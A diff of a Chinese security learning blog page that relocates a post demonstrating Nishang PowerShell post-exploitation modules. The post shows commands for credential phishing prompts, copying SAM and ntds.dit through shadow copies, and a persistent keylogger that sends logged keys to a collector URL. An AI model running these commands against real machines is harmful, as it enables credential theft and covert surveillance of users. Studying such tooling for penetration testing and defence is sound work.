@@ -485,6 +485,195 @@ Keyboard.end();//结束键盘通讯
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/Nishang模块简介及演示/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="scareing">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/Bloglogo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="scareing的学习笔记">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/08/26/Nishang模块简介及演示/" itemprop="url">Nishang模块简介及演示</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
+                2019-08-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Powershell/" itemprop="url" rel="index">
+                    <span itemprop="name">Powershell</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
+<blockquote>
+<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
+</blockquote>
+<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<ul>
+<li>Antak-Webshell //webshell</li>
+<li>Backdoor //后门</li>
+<li>Client //客户端</li>
+<li>Escalation //提权</li>
+<li>Execution //RCE</li>
+<li>Gather //信息收集</li>
+<li>Misc //杂项</li>
+<li>Pivot //跳板及远程执行exe</li>
+<li>Scan //扫描</li>
+<li>powerpreter //文件下载及持续性</li>
+</ul>
+<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
+<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
+<blockquote>
+<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
+</blockquote>
+<p>** Copy-VSS.ps1 **</p>
+<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
+<blockquote>
+<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
+</blockquote>
+<pre><code>Copy-VSS //直接把文件保存到当前路径
+Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>​<br>** FireBuster.ps1 and FireListener.ps1 **</p>
+<blockquote>
+<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
+</blockquote>
+<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
+FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
+<blockquote>
+<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
+</blockquote>
+<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
+.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
+erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
+.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
+Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
+<blockquote>
+<p>获取用户密码的提示信息，如果有的话。</p>
+</blockquote>
+<pre><code>Get-PassHints</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+    <div>
+          
+    </div>
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/PowerSploit基本功能演示/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -640,195 +829,6 @@ Get-Keystrokes -LogPath c:\test.txt
 </ul>
 <p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/03/PowerSploit%E5%9F%BA%E6%9C%AC%E5%8A%9F%E8%83%BD%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
 
-          
-        
-      
-    </div>
-    
-    
-    
-    <div>
-          
-    </div>
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://github.com/scareing/scareing.github.io/2019/08/26/Nishang模块简介及演示/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="scareing">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/Bloglogo.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="scareing的学习笔记">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/08/26/Nishang模块简介及演示/" itemprop="url">Nishang模块简介及演示</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-26T12:12:57+08:00">
-                2019-08-26
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Powershell/" itemprop="url" rel="index">
-                    <span itemprop="name">Powershell</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="Nishang模块简介及演示"><a href="#Nishang模块简介及演示" class="headerlink" title="Nishang模块简介及演示"></a>Nishang模块简介及演示</h1><p>** Nishang **</p>
-<blockquote>
-<p>Nishang是GitHub上的非常好用的Powershell后渗透模块，广泛用于渗透测试的各个阶段.<br>Nishang在PowerShell3.0以上的环境才能正常使用，意思就是win7及更低版本的系统中可能使用有问题。并且会被杀软拦。</p>
-</blockquote>
-<pre><code>$PSVersionTable //查看PowerShell版本</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-<ul>
-<li>Antak-Webshell //webshell</li>
-<li>Backdoor //后门</li>
-<li>Client //客户端</li>
-<li>Escalation //提权</li>
-<li>Execution //RCE</li>
-<li>Gather //信息收集</li>
-<li>Misc //杂项</li>
-<li>Pivot //跳板及远程执行exe</li>
-<li>Scan //扫描</li>
-<li>powerpreter //文件下载及持续性</li>
-</ul>
-<h2 id="Gather"><a href="#Gather" class="headerlink" title="Gather"></a>Gather</h2><p>** Invoke-CredentialsPhish.ps1 **</p>
-<pre><code>Invoke-CredentialsPhish //开启钓鱼</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/2.png" alt="avatar"></p>
-<blockquote>
-<p>欺骗目标主机用户输入Windows账号密码，并且如果不输入正确的账号密码，不能直接关闭。</p>
-</blockquote>
-<p>** Copy-VSS.ps1 **</p>
-<p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/1.png" alt="avatar"></p>
-<blockquote>
-<p>利用Volume Shadow Copy服务复制sam文件，如果机器是域控的话，ntds.dit和SYSTEM hive也能被拷贝出来。</p>
-</blockquote>
-<pre><code>Copy-VSS //直接把文件保存到当前路径
-Copy-VSS -DestinationDir C:\temp //保存到指定的已存在路径</code></pre><p>​<br>** FireBuster.ps1 and FireListener.ps1 **</p>
-<blockquote>
-<p>FireBuster.ps1用于被控端测试端口连通性的。<br>FireListener.ps1用于本机接收连通性测试结果。</p>
-</blockquote>
-<pre><code>FireBuster 172.22.35.250 80-100ose //被控端的80-100端口连接主机的80-100端口。
-FireListener 80-100 //主机监听80-100端口。</code></pre><p><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/3.png" alt="avatar"><br><img src="https://raw.githubusercontent.com/scareing/scareing.github.io/master/2019/08/11/Nishang%E6%A8%A1%E5%9D%97%E7%AE%80%E4%BB%8B%E5%8F%8A%E6%BC%94%E7%A4%BA/4.png" alt="avatar"><br>** Keylogger.ps1 **</p>
-<blockquote>
-<p>Nishang的键盘记录虽然很强大，但是奈何我还没有理解。<br>键盘记录默认保存在当前用户的temp目录下，默认文件名为key.log并且，内容好像是被混淆过，需要用Nishang Utility模块下的Parse_Keys.ps1来解析为明文。</p>
-</blockquote>
-<pre><code>.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis //书上是解释的说检查给出网页中是否包含stopthis也就是我们给出的字符串。如果存在就不记录。
-.\Keylogger.ps1 -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -MagicString stopthis -exfil -ExfilOption WebS
-erver -URL http://192.168.254.226/data/catch.php //将记录发送到指定的可以记录Post请求的服务器。
-.\Keylogger.ps1 -persist //持久化记录，重启后依旧会继续运行。
-Parse_Keys C:\Users\wdnmd\AppData\Local\Temp\Key.log .\parsed.txt //将key.log解析到当前目录下的parsed.txt。</code></pre><p>实在无法理解为什么非要给出一个网址及字符串，但是经过尝试可以将这两个参数给定为空格。<br>** Get-PassHints.ps1 **</p>
-<blockquote>
-<p>获取用户密码的提示信息，如果有的话。</p>
-</blockquote>
-<pre><code>Get-PassHints</code></pre>
           
         
       
